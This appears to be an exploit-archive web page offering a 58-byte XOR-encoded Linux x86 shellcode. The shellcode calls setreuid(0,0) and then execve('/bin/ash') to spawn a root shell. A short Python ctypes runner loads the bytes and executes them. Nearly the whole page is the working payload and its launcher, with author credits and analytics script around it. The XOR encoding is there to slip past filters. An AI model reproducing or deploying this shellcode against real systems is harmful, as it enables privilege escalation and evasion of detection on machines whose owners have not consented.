<html><head><title>Linux/x86 - setreuid (0,0) &amp; execve(/bin/ash,NULL,NULL) + XOR encoded - 58 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
# Title: Linux x86 setreuid (0,0) &amp; execve(&quot;/bin/ash&quot;,NULL,NULL) + XOR encoded - 58 bytes
# Author: egeektronic &lt;info (at) egeektronic {dot} com&gt;
# Twitter: @egeektronic
# Tested on: Slackware 13.37
# Thanks: Jonathan Salwan, Yuda Prawira and Rizki Wicaksono 

from ctypes import *

shell = &quot;\xeb\x0d\x5e\x31\xc9\xb1\x26\x80\x36\x19\x46\xe2\xfa\xeb\x05\xe8\xee\xff\xff\xff\x28\xd9\x28\xc2\x28\xd0\x28\xcb\xa9\x5f\x28\xc2\x28\xd0\xd4\x99\xa9\x12\x4a\x71\x36\x78\x6a\x71\x71\x36\x7b\x70\x77\x90\xfa\x28\xd0\x28\xd0\x4a\xd4\x99&quot;

memory = create_string_buffer(shell, len(shell))

shellcode = cast(memory, CFUNCTYPE(c_void_p))

shellcode()

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
